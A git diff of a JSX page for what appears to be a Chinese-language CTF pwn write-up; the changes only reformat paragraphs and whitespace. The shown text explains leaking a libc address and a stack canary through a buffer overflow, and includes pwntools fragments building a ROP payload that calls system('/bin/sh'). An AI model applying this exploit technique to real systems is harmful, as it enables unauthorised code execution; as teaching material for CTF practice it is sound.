@@ -56,7 +56,9 @@ export default function Post() {
                 `}
             />
             <X.H2>利用</X.H2>
-            <X.P>大致思路：先利用程序输出泄露`libc`地址，便于计算出`libc`中`system`函数的地址，用于后续构造ROP链；然后泄露栈上的`canary`，绕过栈保护机制；最后构造`payload`获取`shell`。</X.P>
+            <X.P>
+                大致思路：先利用程序输出泄露`libc`地址，便于计算出`libc`中`system`函数的地址，用于后续构造ROP链；然后泄露栈上的`canary`，绕过栈保护机制；最后构造`payload`获取`shell`。
+            </X.P>
             <X.CodeBlock
                 language="python"
                 code={`
@@ -101,7 +103,10 @@ export default function Post() {
                     success(f"real libc: {hex(p.libc.address)}") # real libc: 0x73962f000000
                 `}
             />
-            <X.P>获取`canary`，对`buf`的读入有溢出，只要发送`56`字节的数据就能完全覆盖`buf`和`v6`，然后在`printf("hello %s")`中泄露`v7`也就是`canary`。</X.P>
+            <X.P>
+                获取`canary`，对`buf`的读入有溢出，只要发送`56`字节的数据就能完全覆盖`buf`和`v6`，然后在`printf("hello
+                %s")`中泄露`v7`也就是`canary`。
+            </X.P>
             <X.CodeBlock
                 language="python"
                 code={`
@@ -129,7 +134,7 @@ export default function Post() {
                 def exp(libc, p, canary):
                     rop = ROP(libc)
                     rop.call(libc.sym["system"], [next(libc.search("/bin/sh\\0")), 0, 0])
-                
+
                     payload = b"a" * 40 + p64(canary)
                     payload = payload.ljust(56, b"a") + rop.chain()
                     success(f"payload: {payload}")
